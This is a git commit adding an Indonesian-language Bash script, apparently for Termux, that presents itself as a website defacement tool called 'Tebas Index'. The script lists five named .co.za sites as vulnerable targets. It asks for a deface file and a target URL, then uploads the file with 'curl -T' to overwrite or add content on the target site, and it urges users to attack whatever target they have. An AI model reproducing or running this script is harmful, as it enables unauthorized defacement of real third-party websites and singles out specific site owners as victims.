4fa432dcea7fd27fe690cdaf94135164a6023da9
RANDIOLOY <54799488+RandiSr@users.noreply.github.com>
2019-09-05 16:39:44 +0700

    Add files via upload

---
+++ tebasindex.sh
@@ -0,0 +1,45 @@
+#!/bin/bash
+#YouTube Randi oloy
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+mer='\033[41;97m' #Tepi
+st='\033[0m' #Stop
+toilet -f future "TEBAS INDEX" | lolcat
+echo $mer"=========================================="$st
+echo $bi"Author : RandiSr"
+echo $ku"YouTube: RANDI OLOYY"
+echo $pur"Tools  : Tebas InDeX"
+echo $mer"=========================================="$st
+sleep 4
+echo ""
+echo $ku"[°°°List Web Vuln°°°]"
+echo $me"http://­gangways.co.za"
+echo $ku"http://­ibp-jhb.co.za/"
+echo $me"http://­fall-arrest.co.za"
+echo $ku"http://capewinedirect.co.za"
+echo $me"http://liteoptec.co.za"
+echo $i"===================================" $st
+sleep 5
+echo $ku"       Jika Anda Punya Terget"
+echo $ku"       Jangan sunkan untuk menggunakan nya"
+sleep 4
+read -p"Masukan Nama script deface : " script;
+sleep 4
+read -p"Masukan Web yang ingin di Tebas : " web;
+echo $i"Tunggu!.."
+sleep 3
+echo $i"Tunggu.!."
+sleep 3
+echo $i"Tunggu..!"
+termux-setup-storage
+curl -T /storage/emulated/0/$script $web
+sleep 4
+echo $ku"Follow Ig @RanOloy"
+echo $ku"Succes.........;)"
+figlet -f slant "Jumpa Lagi" | lolcat
